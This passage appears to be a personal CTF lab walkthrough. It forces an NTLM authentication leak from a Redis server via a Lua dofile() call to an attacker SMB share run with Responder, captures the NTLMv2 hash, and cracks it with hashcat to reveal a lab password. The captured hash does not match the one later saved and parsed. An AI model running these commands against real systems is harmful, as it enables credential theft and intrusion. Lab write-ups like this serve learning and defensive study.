
## Capturin a NTLM hash

LUA `dofile()` allows us to request a file but since we are on Windows it allows us to request a share as well `dofile('//host/share')`.

So if we launch a SMB server with `Responder` on one hand and force the server to request a share on the other hand, we may be able to capture a NTLM hash.

#Attacking_Machine 
Run responder.

```
sudo responder -I tun0 
```

![[Screenshot from 2025-09-19 20-44-19.png]]

#Redis 
Run this code.

```
10.10.27.61:6379> EVAL "dofile('//<ATTACKING MACHINE IP>/noraj')" 0
```

You'll get this error.
![[Screenshot from 2025-09-19 20-47-15.png]]

But in responder you'll get the NTLM hash.

![[Screenshot from 2025-09-19 20-48-44.png]]

enterprise-security::VULNNET:b0115ce38b7c1bee:E0A5B30A2B1A44D20BEA87E19C9DBD83:010100000000000000CBC5EF7229D000000020008004400300045004E0001001E00570049004E002D004E005700310044005200300048004D004D005A004E0004003400570049004E002D004E00570031004405A004E002E004400300045004E002E004C004F00430041004C00030014004400300045004E002E004C004F00430041004C00050014004400300045004E002E004C004F000CBC5EF7229DC01060004000200000008003000300000000000000000000000003000002A464140C397378CD682EB87F9B4F0500653082C2269A7751E340175B0BDDF9800000000000000000000900240063006900660073002F00310030002E00320033002E003100370037002E003100370038000000000000000000

## Cracking the hash

### Breakdown of the Hash Format

Code

```
username::domain:LM_hash:NTLMv2_hash:blob
```

In your case:

- `enterprise-security` → Username
    
- `VULNNET` → Domain
    
- `e3ce6172d5c46f70` → LM hash (usually ignored or set to a dummy value)
    
- `C9D337B801D753F7C7A99B86B03E799C` → NTLMv2 response hash
    
- Long hex blob → Challenge + timestamp + target info + client nonce

### **Crack It with Hashcat**

#Attacking_Machine 
- Save the hash in a file.
```
echo 'enterprise-security::VULNNET:e3ce6172d5c46f70:C9D337B801D753F7C7A99B86B03E799C:010100000000000000C14A988FF2D7013F2685222C47BE030000000002000800420053005300450001001E00570049004E002D0044003300370033004D0046004A005A0030004F00350004003400570049004E002D0044003300370033004D0046004A005A0030004F0035002E0042005300530045002E004C004F00430041004C000300140042005300530045002E004C004F00430041004C000500140042005300530045002E004C004F00430041004C000700080000C14A988FF2D7010600040002000000080030003000000000000000000000000030000098A6EBD82A72AAFE8801CE20C7E617EA16CC5F12E45BD3FD3F8F6B40F7840A730A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0039002E00310039002E00370037000000000000000000' > hash.txt
```

- Run hashcat with a dictionary. Use mode `5600` for NTLMv2:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![[Screenshot from 2025-09-19 21-01-13.png]]

For username `enterprise-security`, you have the password `sand_0873959498`.


**Next step:** [[Initial access]]
